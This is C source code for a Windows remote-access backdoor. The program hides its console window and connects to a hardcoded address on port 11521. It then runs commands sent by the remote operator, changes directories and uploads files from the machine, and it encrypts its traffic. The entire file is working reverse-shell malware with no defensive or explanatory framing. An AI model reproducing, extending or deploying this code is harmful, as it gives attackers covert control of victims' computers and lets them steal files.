#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <wininet.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <stdint.h>

#include "crypto.h"

#define STATUS_DONE "[+]Done\n"
#define STATUS_END "[+]End\n"
#define STATUS_ERR "[+]Err\n"

void cmdshell(void);

SOCKET sock;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//hide window
	HWND handle = GetConsoleWindow();
	ShowWindow(handle, SW_HIDE);

	//start socket
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
	       exit(0);

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
		exit(0);

	struct sockaddr_in Serv;
	memset(&Serv, 0, sizeof(Serv));
	char * ServIP = "192.168.1.220";

	Serv.sin_family = AF_INET;
	Serv.sin_addr.s_addr = inet_addr(ServIP);
	Serv.sin_port = htons(11521);

	int tries = 0;
	while (connect(sock, (struct sockaddr *)&Serv, sizeof(Serv)) != 0)
	{
		if (tries++ >= 5)
			exit(0);
		sleep(10);
	}
	cmdshell();

	return 0;
}

void cmdshell(void)
{
	char cmd[1024];
	char res[1024];
	char cur_status[1024];
	while (1)
	{
		memset(cmd, 0, sizeof(cmd));
		memset(res, 0, sizeof(res));
		memset(cur_status, 0, sizeof(cur_status));
		recv(sock, cmd, sizeof(cmd), 0);
		decrypt(cmd);
		
		if (!strncmp(cmd, "!exit", 5)) //quit
		{
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (!strncmp(cmd, "cd ", 3))
		{
			char * dirname = &cmd[3];
			chdir(dirname);
			strcpy(cur_status, STATUS_DONE);
			send(sock, encrypt(cur_status), 1024, 0);
		}
		else if (!strncmp(cmd, "!get ", 5))
		{
			char * filename = &cmd[5];
			FILE * fp = fopen(filename, "rb");
			if (fp == NULL)
			{
			    strcpy(cur_status, STATUS_ERR);
				send(sock, encrypt(cur_status), 1024, 0);
				continue;
			}
			unsigned long nread;
		    nread = fread(res, sizeof(char), sizeof(res), fp);
			while (nread == sizeof(res))
			{
				send(sock, encrypt(res), sizeof(res), 0);
				memset(res, 0, sizeof(res));
		        nread = fread(res, sizeof(char), sizeof(res), fp);
			}
			strcpy(cur_status, STATUS_END);
			send(sock, encrypt(cur_status), 1024, 0);
			nread = htonl(nread);
			send(sock, (unsigned char *)&nread, 8, 0);
			nread = ntohl(nread);
			send(sock, encrypt(res), sizeof(res), 0);
			fclose(fp);
		}
		else
		{
			FILE * fp = _popen(cmd, "r"); //execute cmd
			while (fgets(res, sizeof(res), fp) != NULL)
			{
				send(sock, encrypt(res), sizeof(res), 0);
				memset(res, 0, sizeof(res));
			}
			strcpy(cur_status, STATUS_DONE);
			send(sock, encrypt(cur_status), 1024, 0);
			fclose(fp);
		}
	}
}
